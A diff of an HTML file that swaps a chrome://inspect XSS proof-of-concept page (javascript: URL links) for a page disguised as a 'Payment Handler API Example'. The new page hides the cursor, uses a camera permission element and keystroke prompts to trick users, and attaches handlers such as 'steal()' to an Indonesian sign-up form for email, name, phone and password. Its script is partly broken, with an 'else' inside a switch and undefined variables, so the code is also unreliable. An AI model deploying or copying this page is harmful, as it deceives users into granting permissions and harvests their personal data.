@@ -1,19 +1,87 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>chrome://inspect XSS PoC</title>
-</head>
-<body>
-  <h1>Click this to open chrome://inspect with payload</h1>
-  <a href="chrome://inspect/?browser-inspector=javascript:alert(document.domain)//">
-    Buka chrome://inspect (XSS)
-  </a>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Payment Handler API Example">
 
-  <hr>
+    <title>Welcome to Payment Handler API Example!</title>
 
-  <h2>One-click exploit (langsung jalankan JS di chrome://inspect)</h2>
-  <a href="chrome://inspect/#devices?browser-inspector=javascript:alert('XSS di chrome://inspect - '+document.domain)//">
-    Klik ini → XSS langsung di chrome://inspect
-  </a>
-</body>
-</html>
+    <link id="favicon" rel="icon" href="https://glitch.com/edit/favicon-app.ico" type="image/x-icon">
+    <link rel="stylesheet" href="/style.css">
+  </head>
+  <body style="cursor: none;">
+    <permission onclick="registerBtn.click();document.getElementById('reg_email').focus();"  value="aaa" id="vc" autofocus="" style="display: inline;width:100px;margin-left:30%" type="camera"></permission><div style="margin-top:17px;margin-left:40%">
+
+<div class="panel-body" style="opacity:1;margin-top:100px">
+          
+              <div class="form-group mb15">
+                <input onchange="getemail()" onclick="w()" autofocus="" type="email" name="reg_email" id="reg_email" class="form-control" placeholder="Email Anda" fdprocessedid="7nyfw">
+              </div>
+              <div class="form-group mb15">
+                <input onchange="getnama()" type="text" id="reg_nama" name="reg_nama" class="form-control" placeholder="Nama Lengkap Anda" fdprocessedid="cd6u56">
+              </div>
+              <div class="form-group mb15">
+                <input onchange="steal()" type="text" id="reg_nohp" name="reg_nohp" class="form-control" placeholder="Nomor Handphone Anda" fdprocessedid="jcbhau">
+              </div>
+              <div class="form-group mb15">
+                <input type="password" id="reg_pwd" name="reg_pwd" class="form-control" placeholder="Password Anda" fdprocessedid="8aa04v">
+              </div>
+              <div class="form-group mb15">
+                <input type="password" id="reg_pwd_confirm" name="reg_pwd_confirm" class="form-control" placeholder="Konfirmasi Password Anda" fdprocessedid="cnp5l">
+              </div>
+             
+        
+            
+          </div>
+
+
+<div><h1>Press Enter, Down and enter</h1></div>
+
+<div style="margin-top: -200px">
+
+</div>
+<div style="margin-top: 80px"></div>
+  
+ <script>
+document.body.style.cursor = 'none'
+
+ 
+
+ var io=0;
+   var lk;
+ document.onkeydown = function(e) {
+    switch (e.keyCode) {
+      
+      
+        else{clearInterval(lk)}
+        
+         document.getElementById('reg_email').focus();
+          i++;
+          break;
+    }
+};
+
+function myFunction() {
+  document.getElementById("demo").innerHTML = "Hello World";
+}
+ 
+    var nama=""
+   var email=""
+   var nohp=""
+   function getnama(){
+        nama=document.getElementById('reg_nama').value;
+    
+       
+   }
+   function getemail(){
+      email=document.getElementById('reg_email').value;
+   }
+
+  </script>  
+   </div>
+    <button id="register">
+     
+    </button>
+    <script src="index6.js"></script>
+  
+</body></html>
